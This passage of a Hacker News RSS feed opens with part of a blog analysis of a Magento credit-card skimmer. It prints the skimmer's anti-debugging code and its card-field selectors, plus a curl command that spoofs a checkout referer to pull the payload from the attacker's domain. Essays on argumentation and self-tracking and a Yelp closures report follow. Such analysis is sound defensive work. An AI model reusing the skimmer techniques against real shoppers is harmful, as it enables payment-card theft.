        <span>// constantly checks if devtools are opened every 300 ms</span>
        <span>// if it's the case, it deletes the code of the skimmer</span>
        <span>// This it helps to remain undetected if someone is trying to do some analysis</span>
        <span>if</span> <span>(</span><span>a0c</span><span>())</span> <span>{</span>
            <span>if</span> <span>(</span><span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'cloud'</span><span>))</span> <span>{</span>
                <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'cloud'</span><span>).</span><span>outerHTML</span> <span>=</span> <span>''</span><span>;</span>
            <span>}</span>
        <span>}</span>
    <span>},</span> <span>300</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<h2 id="obtaining-and-analyzing-the-code-of-the-skimmer">Obtaining and analyzing the code of the skimmer</h2>
<p>We want to load the code of the skimmer to analyze it and execute it.
However, if we visit the URL contained in the skimmer loader, the page doesn’t return anything.</p>
<p><img src="https://antoinevastel.com/assets/media/empty_file_skimmer.png"></p>
<p>My intuition was that they were verifying if the request was coming from a page where it makes sense to include the skimmer, e.g. a checkout page.
Thus, I forged a request with curl to pretend the request was coming from a checkout page:</p>
<div><div><pre><code>curl 'http://ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js' \
  -H 'Connection: keep-alive' \
  -H 'Referer: https://randomwebsite.com/xxx/checkout/yyy' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' \
  --compressed \
  --insecure
</code></pre></div></div>
<p>When we lie about the referer, the page now returns an obfuscated script.
This time it’s bigger than the simple skimmer loader, ~ 1.7K lines of codes.
We deobfuscate it using <a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a>.
Although the deobfuscation is not complete at all, it still helps to decode obfuscated strings.</p>
<p>Before we analyze more in details the content of the skimmer, it can be split into three main parts that intertwined because of obfuscation:</p>
<ol>
<li>Anti debugging techniques (same as in the skimmer loader + other techniques to detect if the code has been unminified)</li>
<li>Listening to user events (mouse click) and reading values submitted by the user (credit card, name, address, etc)</li>
<li>Obfuscating/encoding the value of the payload to remain undetected.</li>
</ol>
<p>In the remainder of this blog post, I explain how I was able to analyze the skimmer, in particular how I deactivate the anti-debugging protection, and I also present the main information collected by the skimmer.</p>
<p>At first sight, we quickly notice several arrays of strings related to CSS selectors related HTML elements where users submit information for their credit card.</p>
<div><div><pre><code><span>window</span><span>.</span><span>RXExxwZOCk</span> <span>=</span> <span>[</span><span>"*[name*='n"</span> <span>+</span> <span>'umero_cart'</span> <span>+</span> <span>"ao']"</span><span>,</span> <span>'input[id*='</span> <span>+</span> <span>"'cc_number"</span> <span>+</span> <span>'</span><span>\'</span><span>]'</span><span>,</span> <span>"*[name*='cc_num']"</span><span>,</span> <span>'#pagarme_cc_cc_number'</span><span>,</span> <span>'#omise_gateway_cc_number'</span><span>,</span> <span>'#stripeCardNumber'</span><span>,</span> <span>'#card-number'</span><span>,</span> <span>'#field--card-number'</span><span>];</span>
<span>window</span><span>.</span><span>ntRYdQZqASm</span> <span>=</span> <span>[</span><span>"*[name*='e"</span> <span>+</span> <span>'xpiracao_m'</span> <span>+</span> <span>"es']"</span><span>,</span> <span>"*[name*='cc_exp_m']"</span><span>,</span> <span>"*[name*='e"</span> <span>+</span> <span>'xpirationM'</span> <span>+</span> <span>"onth']"</span><span>,</span> <span>'#pagarme_cc_expiration'</span><span>,</span> <span>'#omise_gateway_expiration'</span><span>,</span> <span>'#stripeCardExpiryMonth'</span><span>,</span> <span>'#field--month'</span><span>];</span>
<span>window</span><span>.</span><span>adVWkXfNfcv</span> <span>=</span> <span>[</span><span>"*[name*='c"</span> <span>+</span> <span>'c_exp_date</span><span>\'</span><span>]'</span><span>,</span> <span>'#card-date'</span><span>];</span>
<span>window</span><span>.</span><span>NnNndlyI</span> <span>=</span> <span>[</span><span>"*[name*='e"</span> <span>+</span> <span>'xpiracao_a'</span> <span>+</span> <span>"no']"</span><span>,</span> <span>"*[name*='cc_exp_y']"</span><span>,</span> <span>"*[name*='e"</span> <span>+</span> <span>'xpirationY'</span> <span>+</span> <span>"ear']"</span><span>,</span> <span>'#pagarme_cc_expiration_yr'</span><span>,</span> <span>'#omise_gateway_expiration_yr'</span><span>,</span> <span>'#stripeCardExpiryYear'</span><span>,</span> <span>'#field--year'</span><span>];</span>
<span>window</span><span>.</span><span>VkJhhFNh</span> <span>=</span> <span>[</span><span>"*[name*='c"</span> <span>+</span> <span>'odigo_segu'</span> <span>+</span> <span>"ranca']"</span><span>,</span> <span>'input[id*='</span> <span>+</span> <span>"'cc_cid']"</span><span>,</span> <span>"*[name*='cc_cid']"</span><span>,</span> <span>"*[name*='cc_cvv']"</span><span>,</span> <span>'#pagarme_cc_cc_cid'</span><span>,</span> <span>'#omise_gateway_cc_cid'</span><span>,</span> <span>'#stripeCardCVC'</span><span>,</span> <span>'#card-code'</span><span>,</span> <span>'#field--cvv'</span><span>];</span>
</code></pre></div></div>
<p>For example, for the window.RXExxwZOCk variable:</p>
<div><div><pre><code><span>// Once concatenated we obtain the following array of strings:</span>
<span>[</span><span>"*[name*='numero_cartao']"</span><span>,</span> <span>"input[id*='cc_number']"</span><span>,</span> <span>"*[name*='cc_num']"</span><span>,</span> <span>"#pagarme_cc_cc_number"</span><span>,</span> <span>"#omise_gateway_cc_number"</span><span>,</span> <span>"#stripeCardNumber"</span><span>,</span> <span>"#card-number"</span><span>,</span> <span>"#field--card-number"</span><span>]</span>
</code></pre></div></div>
<p>I created a simple HTML page that includes one HTML element that matches a CSS selector present in the array above.
However, if you try to execute the skimmer in the HTML page and open the dev tools to analyze the execution flow, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://antoinevastel.com/fraud/2020/09/20/analyzing-magento-skimmer.html">https://antoinevastel.com/fraud/2020/09/20/analyzing-magento-skimmer.html</a></em></p>]]>
            </description>
            <link>https://antoinevastel.com/fraud/2020/09/20/analyzing-magento-skimmer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534259</guid>
            <pubDate>Sun, 20 Sep 2020 14:30:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dictionary of Arguments and Positions (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534203">thread link</a>) | @abetterday
<br/>
September 20, 2020 | https://www.growwiser.com/2018/10/01/dictionary-of-arguments-and-positions/ | <a href="https://web.archive.org/web/*/https://www.growwiser.com/2018/10/01/dictionary-of-arguments-and-positions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>I’ve long been bothered by impediments to good-faith inquiry and difficulty of accurate information transmission. Positions seem disadvantaged by candor and sophistication. This tempts disillusionment, carelessness, and manipulativeness.</p>
<p>While some difficulties are inescapable, I’ve begun to feel that many are created or nurtured by outdated expectations and tools we bring to discourse. I am not yet confident that my thoughts coalesce into a coherent and achievable alternative, but they feel far enough along to attempt relaying.</p>
<p>I’ll start by briefly expanding on annoyances driving this. Next, I’ll diagnose the problem and sketch elements of the solution. Then, I’ll discuss components of implementation. I’ll conclude by touching on difficulties and objections. Finally, in an <a href="https://www.growwiser.com/2018/10/01/dictionary-of-arguments-and-positions/#tools">addendum</a>, I’ll list potentially compatible efforts and tools.<span id="more-425"></span></p>
<h2 id="incoherence">Incoherence</h2>
<p>If you approach complaints, requests, demands, suggestions, and pleas with an open mind you’ll <a href="https://en.wikipedia.org/wiki/Principle_of_charity">look</a> for truth and coherence in them. If you also approach them with compassion and optimism you’ll want aid them. If integrity is important, you’ll attempt to adjust personal and institutional <a href="https://www.growwiser.com/2015/04/28/anatomy-of-action-and-understanding/">action hierarchies</a> to incorporate resulting truths, constraints, and goals. With enough effort and sacrifice you might make progress and feel more confident, driven, virtuous, and wise.</p>
<p>But each new request adds facts, constraints, and desires that make integration with previously assimilated requests increasingly difficult. Eventually, even the most resourceful and determined will relent and admit that demands cannot be reconciled. Desires, axioms, and constraints of independently reasonable requests conflict with each other; to make progress, one has to choose.</p>
<p>Such conflicts are too <a href="https://www.growwiser.com/2017/03/01/laws-of-absolute-belief-and-plurality/">fundamental</a> to be confined to overtly incompatible positions. Ostensibly sensible combinations of requests and positions hide incoherence. Usually, inconsistencies simply aren’t sought. Sometimes, they are obscured by seemingly innocuous justifications.<sup id="footnote_plugin_tooltip_1" onclick="footnote_moveToAnchor('footnote_plugin_reference_1');">1</sup><span id="footnote_plugin_tooltip_text_1">As <a href="https://en.wikipedia.org/wiki/Willard_Van_Orman_Quine">W. V. Quine</a> argued in&nbsp;<a href="https://en.wikipedia.org/wiki/Two_Dogmas_of_Empiricism"><em>Two Dogmas of Empiricism</em></a>: “Any statement can be held true come what may, if we make drastic enough adjustments elsewhere in the system.”</span> Occasionally, consistency itself is downplayed. In one way or another, positions often end up depending on premises that are trivialized, denied, or disproved elsewhere.</p>
<p>Or maybe it just seems that way. Maybe there is misunderstanding rather than negligence, ignorance, or hypocrisy. After all, no one knows all the truths and constraints we are trying to balance. No one knows the amount of effort we’ve put into coherence or the sacrifices we’ve made to accommodate requests of others. No one understands the precise problem we are trying to solve. Perhaps, not even ourselves. Of course, no one knows all the mistakes we’ve made either.</p>
<p>But whether incoherence is real or imagined, it must be untangled to approach truth. Unfortunately, the responsible axioms and connections hide well.</p>
<p>Even with good faith, we talk past each other because we are solving different problems. We misunderstand because these problems aren’t adequately defined. We make logical errors because the same challenges apply within ourselves.</p>
<h2 id="repetitiveness-and-verbosity">Repetitiveness and Verbosity</h2>
<p>There is little new under the sun. Attempts to explain, prove, and understand involve an overwhelming amount of duplication. This duplication makes continued engagement difficult. Positions become cliches. Arguments become strawmen. Inquiries become annoyances. Adversaries become contemptible.</p>
<p>But careful attention, <a href="https://rationalwiki.org/wiki/Straw_man#Steelmanning">steelmanning</a>, and avoidance of platitudes just leads to complex prose that duplicates in unique, verbose, error-prone ways. Instead of glossing over with compression and simplification, it obscures with volume and nuance. Instead of being countered with opposing platitudes, it gets countered with misunderstanding and pedantry.</p>
<p>To make progress, we need to <a href="https://www.growwiser.com/2015/06/24/magic-and-the-challenge-of-action/#magic-and-communication">discuss the same axiom or connection</a>. Showcasing knowledge elsewhere just encourages more sophisticated <a href="https://en.wikipedia.org/wiki/Talking_past_each_other">talking past each other</a>. And proving&nbsp;such knowledge only further endangers focus and inflates effort.</p>
<p>There are good reasons for quality content to retrace territory. It validates author’s understanding of the subject and of their interlocutor’s arguments. It makes the material a more complete work that can stand alone. It makes the subject more accessible to curious bystanders.</p>
<p>But reasons like these come from a time when knowledge was precious and difficult to access. They make less sense in a world of online resources, cheap publishing, and volumes of content optimized for every conceivable audience. Yet publications continue to retrace enough territory to bury their core point. Indeed, resulting discussion rarely ends up centered on anything likely to have been one.</p>
<h2 id="difficulty-of-progress">Difficulty of Making Progress</h2>
<p>Incoherence, repetitiveness, and verbosity wouldn’t be so bad if language was precise: we could retrace the argument with a bit of effort. Unfortunately, <a href="https://en.wikipedia.org/wiki/Philosophy_of_language">it is anything but</a>.</p>
<p>Every sentence brings a possibility of mistaken construction or interpretation. Every simplification, metaphor, or example can be confused for the point itself or questioned on its accuracy and relevance. Possible interpretations multiply with every statement, repetition, ambiguity, and mistake.</p>
<p>Nor would it be so bad if we had perfect recall: we could return to potential conflicts together with context and when we did resolve issues, we’d remember how we did it. Unfortunately, all we get is a faint intuition of inconsistency.</p>
<p>It takes much error-prone effort to approach the state where we formed connections that now appear suspect. And we remain uncertain of its differences from the original. This can be true even within the confines of a conversation and only worsens with time. We progress by turning solutions into <a href="https://www.growwiser.com/2015/06/24/magic-and-the-challenge-of-action/">magic</a> and the process is rarely reversible. Even when our magic is a result of exhaustive inquiry, after a enough time we might only be able to stare blankly at an interlocutor who questions it.</p>
<h2 id="positions-as-programs">Positions as Computer Programs</h2>
<p>Positions are comparable to computer programs: they encode beliefs into <a href="https://en.wikipedia.org/wiki/Black_box">systems</a> that provide answers to questions posed by incoming data. Like computer programs they are susceptible to flaws: from invalid assumptions to logical errors, from misprocessed input to unclear output. And computer programs demonstrate just how large, delicate, and <a href="https://en.wikipedia.org/wiki/Programming_complexity">complex</a> the task of making positions explicit is.</p>
<p>But while software engineering has <a href="https://en.wikipedia.org/wiki/Software_design">evolved</a> to reduce the burden and risk, argumentation remains barely at <a href="https://en.wikipedia.org/wiki/Punched_card">punch cards</a>. We continue to interact with positions through ancient approaches despite availability of modern resources, despite the variety and intricacy of modern positions, despite them arguably encoding more information than complex programs.</p>
<p>It is terrifying to imagine modern software without <a href="https://en.wikipedia.org/wiki/Code_reuse">code reuse</a>, <a href="https://en.wikipedia.org/wiki/Side_effect_(computer_science)">side-effect management</a>, <a href="https://en.wikipedia.org/wiki/Test_automation">automated testing</a>, <a href="https://en.wikipedia.org/wiki/Version_control">version control</a>, <a href="https://en.wikipedia.org/wiki/Debugging">interactive debugging</a>. Every line of code in every program written from scratch: referencing the work of others, but always reinterpreting and rewriting it in unique ways. Haphazard jumps between program areas being modified. Little verification that changes leave working code. Loose, if any, tracking of the logic behind, or the content of, such jumps and changes. Limited ability to deterministically trace through running code.</p>
<p>Argumentation is worse than even that. It’s like we try to modify the same code base, but all insist on using separate evolving languages to implement different goals based on distinct assumptions while presuming that our beliefs and intentions are too obvious to be misunderstood. And we all feel entitled to change other people’s code at will. Incoherence, misunderstanding, repetitiveness, verbosity, and disillusionment indeed.</p>
<h2 id="essence-of-issue">Essence of the Issue</h2>
<p>The core of the problem is that we don’t store positions in an accessible manner. We develop them through a messy combination of reading, experience, thought, and interaction. Then we turn them into inaccessible magic or relay them using error-prone communication.</p>
<p>Original beliefs and goals become fuzzy. The ‘aha’ moments and their supporting circumstances – so crucial to the path we end up taking – lose their clarity. We feel evermore compelled to explain, but rarely end up feeling more understood. And we can’t truly understand positions of others without going through a painstaking, unique, error-prone process comparable to theirs.</p>
<p>Which is stupefying and infuriating because while the specific hierarchy of axioms, constraints, and goals that drives our action and understanding is highly individual, perhaps even unique, few, if any, of the parts are. Nearly every component has been extensively argued, researched, and experimented with. Each has been subdivided into nearly every possible set of coherent axioms, trade-offs, and conclusions. Many of these sets have been named. We should be able to build our positions simply by selecting canonical versions of components that match our beliefs.</p>
<p>The components aren’t beyond doubt or improvement. But as with <a href="https://en.wikipedia.org/wiki/Library_(computing)">code libraries</a> and the <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">DRY programming principle</a>, we should reserve unique explanations and proofs for integrations, deviations, and extensions where we hope to add value. We should not attempt them unnecessarily en route to somewhere else.</p>
<p>The good news is that the work humanity has done over thousands of years to discover, cohere, elaborate, and name these different components is readily accessible. The bad news is that it is accessible in written form with all its imperfections. And many people have generated many words interpreting, reinterpreting, clarifying, embellishing, and confusing these positions so we can’t trust that use of <a href="https://en.wikipedia.org/wiki/Essentially_contested_concept">same terms</a> describes the same underlying beliefs.</p>
<p>Canonical positions exist, yet can’t easily be found. We add volumes of prose to explain ourselves. This only buries canonical positions deeper.</p>
<p>The issue isn’t primarily that of authority. From Wikipedia to the Stanford Encyclopedia of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.growwiser.com/2018/10/01/dictionary-of-arguments-and-positions/">https://www.growwiser.com/2018/10/01/dictionary-of-arguments-and-positions/</a></em></p>]]>
            </description>
            <link>https://www.growwiser.com/2018/10/01/dictionary-of-arguments-and-positions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534203</guid>
            <pubDate>Sun, 20 Sep 2020 14:20:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yelp: Local Economic Impact Report]]>
            </title>
            <description>
<![CDATA[
Score 141 | Comments 172 (<a href="https://news.ycombinator.com/item?id=24534186">thread link</a>) | @bookofjoe
<br/>
September 20, 2020 | https://www.yelpeconomicaverage.com/business-closures-update-sep-2020.html | <a href="https://web.archive.org/web/*/https://www.yelpeconomicaverage.com/business-closures-update-sep-2020.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      
    
    <section>
      <!--<p class='prose flag'><i>If you'd like additional detail on how the economy is shifting, please contact us at <a href='mailto:press@yelp.com'>press@yelp.com</a> or <a class=underline href=http://eepurl.com/cMFvGL target=_blank>join our mailing list</a> to receive an email when new reports are released.</i></p>-->
    
      
        <p>Since the first fears of the pandemic emerged in the U.S. in early March, businesses across the nation have endured six months of uncertainty. Yet, businesses are adapting and proving their resilience through lockdowns, reopenings, a <a href="https://www.nytimes.com/interactive/2020/us/coronavirus-us-cases.html?name=styln-coronavirus-markets&amp;region=TOP_BANNER&amp;variant=1_Show&amp;block=storyline_menu_recirc&amp;action=click&amp;pgtype=Article&amp;impression_id=76e345d2-e946-11ea-8ee3-5b12c6c78bc9" target="_blank">summer surge in virus cases</a>, new ways of doing business such as <a href="https://www.nytimes.com/2020/08/23/nyregion/outdoor-dining-new-york.html" target="_blank">outdoor dining</a>, new mask wearing rules and backlash from <a href="https://www.washingtonpost.com/nation/2020/07/18/covid-pandemic-store-clerk-north-carolina/?arc404=true" target="_blank">anti-mask patrons</a>, as well as milestones such as the <a href="https://www.yelpeconomicaverage.com/back-to-school-2020.html" target="_blank">return to school</a>. Even in the wake of increased closures we’re seeing businesses effectively transition to new operating models while keeping their employees and consumers safe.</p>
        <p>Yelp closure data shows that businesses providing home, local and professional services have been able to withstand the effects of the pandemic particularly well. But despite bright spots in some sectors, restaurants and retail continue to struggle and total closures nationwide have started to increase.</p>
        <p>The <a href="https://www.yelpeconomicaverage.com/yea-q2-2020.html" target="_blank">last Yelp Economic Average</a> showed a decreasing number of overall closures, 132,580 in total. As of August 31, 163,735 total U.S. businesses on Yelp have closed since the beginning of the pandemic (observed as March 1), a 23% increase since July 10. In the wake of COVID-19 cases increasing and local restrictions continuing to change in many states we’re seeing both permanent and temporary closures rise across the nation, with 60% of those closed businesses not reopening (97,966 permanently closed).</p>
    </section>
    
    <section>
      <h3>Business Closures Continue to Increase Nationally</h3>
      <h4>Number of businesses marked closed on Yelp that were open March 1</h4>
      <p><i></i>Hover over a circle to see closures</p>
    	
    </section>
    
    <!--
    <section class='report-wrapper'>
    	<h3 class='centered-title'>Business Closures Continue to Increase Nationally</h3>
      <h4 class='centered-title'>Number of businesses marked closed on Yelp that were open March 1</h4>
    
    	<div class='static-image-container'>
    		<img class='static-image-desktop' src='./assets/img/closures092020/Closures_Rate_Desktop-2a05305cb0.png'/>
    		<img class='static-image-tablet' src='./assets/img/closures092020/Closures_Rate_Desktop-2a05305cb0.png'/>
    		<img class='static-image-mobile' src='./assets/img/closures092020/Closures_Rate_Mobile-f0f8a42c99.png'/>
    	</div>
    </section>
    -->    <section>
    	<h2>Resilient Businesses Operating in an Unpredictable Economy</h2>
        <p>Some business sectors have been able to weather the COVID-19 storm particularly well. In general, professional services and solo proprietors as a whole have been able to maintain a relatively low fraction of closures since March 1. This group includes lawyers, real estate agents, architects, and accountants – all with only two to three out of every thousand businesses closed, as of August 31. Health related businesses in particular have been able to maintain a low rate of closures – orthopedists, internal medicine, hospitals, physicians, family doctors and OB/GYNs all have less than three closures out of every thousand businesses.</p>
        <p>Yelp’s closure data also shows that demand for <a href="https://blog.yelp.com/2020/08/yelp-reinvents-the-hiring-experience-for-home-and-local-services" target="_blank">home, local</a> and automotive services has remained robust with a far lower rate of closures compared to restaurants and retail. Towing companies, plumbers and contractors in particular have maintained a low rate of closures, with only six to seven out of every thousand businesses closed. In fact, the share of consumer interest in home and local services is up 24% between March 1 and August 31, relative to all categories on Yelp, compared to the same time last year.</p>
    </section>
    
    <section>
    	<h3>Home, Local, Professional, and Auto Services Prove Their Strength Amid the Pandemic</h3>
    
    	<p><img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Sector_Desktop-b84f739960.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Sector_Desktop-b84f739960.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Sector_Mobile-069e01b319.png">
    	</p>
    </section>    <section>
      <h2>Restaurants Remain Hardest Hit, Permanent and Temporary Closures Increase</h2>
        <p>The restaurant industry continues to be among the most impacted with an increasing number of closures – totalling 32,109 closures as of August 31, with 19,590 of these business closures indicated to be permanent (61%). Breakfast and brunch restaurants, burger joints, sandwich shops, dessert places and Mexican restaurants are among the types of restaurants with the highest rate of business closures. Foods that work well for delivery and takeout have been able to keep their closure rates lower than others, including pizza places, delis, food trucks, bakeries and coffee shops.</p>
        <p>Meanwhile, bars and nightlife, an industry 6X smaller than restaurants, has endured an especially high closure rate, with an increasing percentage of closures being permanent. As of the end of August there were 6,451 total business closures, of which 3,499 were permanently closed (54%). The share of permanent closures within bars and nightlife have increased by 10% since our <a href="https://www.yelpeconomicaverage.com/yea-q2-2020.html" target="_blank">Economic Average Report</a> in July.</p>
        <p>Retail and shopping follows closely behind restaurants with 30,374 total business closures, 17,503 of which are permanent (58%). Similar to bars and nightlife, the share of permanent closures increased by 10% since July. Both men and women’s clothing, as well as home decor, have the highest rate of business closures.</p>
        <p>The beauty industry has seen a 22% increase in closures since July, totalling 16,585 closures. Of all closed businesses in the beauty industry 7,002 won’t reopen (42%), a significant 43% increase since July when we reported that 4,897 of all closures in the beauty industry were permanent. Similarly the fitness industry has endured a 23% increase in closures since July, with 6,024 total closures, 2,616 of which are permanently closed.</p>
    </section>
    
    <section>
    	<h3>Restaurants and Retail Continue to Struggle</h3>
      <h4>Number of businesses marked closed on Yelp that were open March 1</h4>
    
    	<p><img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Category_Desktop-91d671567c.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Category_Desktop-91d671567c.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Category_Mobile-529b856e87.png">
    	</p>
    </section>    <section>
      <h2>Larger States and Metros See a Greater COVID-19 Impact on Local Businesses</h2>
        <p>Even as the pandemic spreads nationally, geographically Yelp data shows business closure rates vary across the country. Bigger states and metros with higher rents and more stringent local operations for small businesses throughout the last six months have felt a greater toll. So have businesses more closely linked to physical locations that require crowds of consumers to attain profitability. Meanwhile, smaller cities and solo operations that can do their work one-on-one or virtually have proven better positioned to stay in business.</p>
        <p>For the states with widespread business closures, the economic struggle appears to be closely coupled with unemployment rates. Hawaii, California, and Nevada have the highest rate of total closures and permanent closures – they’re also the three states with the <a href="https://finance.yahoo.com/news/these-states-are-suffering-from-the-worst-unemployment-rates-144451899.html?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAABND8yZDak2Xg6GnNC9LukDHqDayj3GYnFbfZn_9NctEnowVC1JMpg9oZFKixnWrRLGLPortUEEaymyEAYmZ0jMN8vOuriLR1N7S0Roqv9OT99H-WdN5XH_sd_I_r0-EgEJSDExY9yTtI7Xduv3Q-Agxb55dUepi3-k8T1fGZ153" target="_blank">highest unemployment rates</a>, and among the <a href="https://www.worldatlas.com/articles/the-most-visited-states-in-the-us.html" target="_blank">biggest states for tourism</a>. Meanwhile, West Virginia and the Dakotas have the lowest closure rates.</p>
        <p>The states with the most closures are home to the hardest-hit metros: Las Vegas in Nevada, Honolulu in Hawaii, and several of the largest California urban areas all are among the metro areas with the highest total closure and permanent closure rates (San Diego, San Francisco, San Jose, Los Angeles and others), with roughly 20 businesses per thousand temporarily or permanently closing their doors since March 1. Larger metros with far fewer closures tend to be in the East, including Pittsburgh, Philadelphia, and Baltimore, all with closure rates below 10 per thousand.</p>
    </section>
    
    <section>
    	<h3>Where are the Most Businesses Closed?</h3>
      <h4>Geographic areas with the largest number of business closures since March 1</h4>
    	<div>
    		<p>Total Closures</p>
    		<p>Closures per 1,000</p>
    	</div>
    
    	<p><img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Geography_Total_Desktop-dce0442da9.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Geography_Total_Desktop-dce0442da9.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Geography_Total_Mobile-98f53c8115.png">
    	</p>
    
    	<p><img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Geography_Capita_Desktop-846de29ad1.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Geography_Capita_Desktop-846de29ad1.png">
    		<img src="https://www.yelpeconomicaverage.com/assets/img/closures092020/Closures_Geography_Capita_Mobile-1878bbd645.png">
    	</p>
    </section>
    <section>
        <p>Keep an eye out for our next update in our Q3 <a href="https://www.yelpeconomicaverage.com/index.html" target="_blank">Yelp Economic Average</a>.</p>
        <p>—Carl Bialik and Daniel Gole contributed to this report</p>
    </section>
    
    <section>
        <p><em>If you'd like additional detail on how the economy is shifting, please contact us at <a href="https://www.yelpeconomicaverage.com/cdn-cgi/l/email-protection#364644534545764f535a461855595b"><span data-cfemail="d0a0a2b5a3a390a9b5bca0feb3bfbd">[email&nbsp;protected]</span></a> or <a href="http://eepurl.com/cMFvGL" target="_blank">join our mailing list</a> to receive an email when new reports are released.</em></p>
        <p><em>Interested in learning how Yelp data can assist you in developing market insights for your business? Yelp Knowledge can help, learn more <a href="https://www.yelp.com/knowledge" target="_blank">here</a>.</em></p>
    </section>
    
    
    <!--
    <section class='report-wrapper'>
    </section>
    -->
    
    <section>
    	
    	<h2>Methodology</h2>
    
    		<p><em>Business Closures</em></p>
    		<p>On each date, starting with March 1, we count U.S. businesses that were open on March 1 and were closed on that day. Closure can be permanent or temporary, and is signaled by a business owner marking the business as closed, including by changing its hours or through a COVID-19 banner on its Yelp page. Closure counts are likely an estimate of the businesses most impacted, with many others not counted because they remain open with curtailed hours and staffing, or because they have not yet updated their Yelp business pages to reflect closures. Additionally, we only count closures that have been vetted by our User Ops team or have been updated directly by a business owner. Closures are counted by state, metro area, and category; some businesses are in more than one category. Businesses can also set automatic reopening dates on Yelp, which are counted as reopenings unless the business updates their information.</p>
    		<p><em>Downloadable static graphics can be found <a href="https://drive.google.com/drive/folders/1kSIOmVz_06NEP37NRfkODkzrpE0lAl3X?usp=sharing" target="_blank">here</a>.</em></p>
    		<p><em>See Yelp's previous Local Economic Impact Reports at our Data Science Medium, <a href="https://medium.com/tag/yelp-coronavirus-report/archive" target="_blank">Locally Optimal</a>.</em></p>
    </section>
    <section>
      <!-- <p class='prose'><strong>Interested in the numbers behind YEA? Check out the <a class='underline' href='./methodology.html'>methodology</a>.</strong></p> -->
      
    </section>    
  </div></div>]]>
            </description>
            <link>https://www.yelpeconomicaverage.com/business-closures-update-sep-2020.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534186</guid>
            <pubDate>Sun, 20 Sep 2020 14:17:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Syntax for Self-Tracking]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534179">thread link</a>) | @mg
<br/>
September 20, 2020 | https://www.gibney.de/a_syntax_for_self-tracking | <a href="https://web.archive.org/web/*/https://www.gibney.de/a_syntax_for_self-tracking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div><meta property="og:image" content="https://www.gibney.de/images/direct/cat_size02/162.jpg?v2">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@marekgibney">
<meta name="twitter:title" content="A Syntax for Self-Tracking">
<meta name="twitter:description" content="How I keep a machine readable self-tracking log in a text file.">
<meta name="twitter:image" content="http://www.gibney.de/images/direct/cat_size02/162.jpg?v2">





<p>For a while now, I have been doing self-tracking in a text file. The reason is that I want to track not only one aspect of life, like fitness or health or nutrition, but anything that I suspect might be interesting to analyze later. Like how the time I wake up impacts my mood. Or which eye drops work best to prevent dry eyes. Or how the temperature of my bedroom impacts my energy the next day. Did I wake up with a headache because I ate pizza late at night? Or because I slept with the window wide open? Maybe I should avoid one of these in the future?</p>

<p>If a completely context-free self-tracking app exists, I am not aware of it. Every tracking app seems to apply only to a certain narrow topic - often sport or food. And then all the apps send the data to a central server, which makes me uncomfortable.</p>

<p>To get started experimenting with context-free self-tracking, I tried it in a simple text file. As it turns out, it is surprisingly doable, and it has led me to a bunch of interesting results already.</p>

<p>It has led to a data structure that I find useful to do context-free self-tracking. A bit like the Git data structure: you can manipulate it with simple tools, and if you are nerd enough you might stick with those. I, for example, use only raw Git to do version control. And I only use Vim to operate on the self-tracking data structure I describe in this article. The general population would probably prefer higher-level tools (i.e., an app), which I will probably write later on. But first I want to get the data structure right.</p>

<p>I started with a simple space-separated approach of "date time event":</p>

<p>
2020-05-28 18:41 Eat Pizza<br>
2020-05-29 09:00 Slept with the window open<br>
2020-05-29 09:00 Headaches<br>
</p>

<p>Everything is freeform. There is just one rule:</p>

<p>
 1: Every line starts with the date and time
</p>

<p>This gives me the complete freedom to log whatever data I want. But I knew there would be more than just free text logging in the future. Structured logging of quantities (how many kilometers I ran, how many hours I slept), fine-grain data on multiple levels (How strong is the headache? Is it on the right or left side?), proper A/B tests, etc. I wanted to keep the option to introduce all this into the syntax without losing the freedom of logging free text. So I made this second rule:</p>

<p>
2: Everything until [^a-z ] describes an observation
</p>

<p>(A non-technical way to put it: Everything that only consists of the characters A-Z plus the space sign describes an observation.)</p>

